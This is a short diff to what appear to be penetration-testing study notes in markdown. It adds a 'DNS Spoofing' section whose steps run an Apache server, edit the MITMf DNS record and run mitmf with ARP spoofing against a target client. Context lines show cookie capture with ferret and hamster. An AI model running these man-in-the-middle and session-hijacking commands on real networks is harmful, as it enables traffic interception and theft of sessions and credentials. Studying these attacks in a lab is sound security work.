@@ -99,3 +99,12 @@ If the user clicks on the "remember me" button a cookie is made in the browser. 
   * `ferret -i wlan0`
 * Web GUI to see the cookies and inject them into my browser
   * `hamster`
+### DNS Spoofing
+* Start Apache Server
+  * `service apache2 start`
+  * The content of the page is in `/var/www/html`
+* Edit DNS settings
+  * `leafpad /etc/mitmf/mitmf.conf`
+  * Edit the `A` record, that is responsible for translate names to IP adresses
+* Become the MITM
+  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --dns`
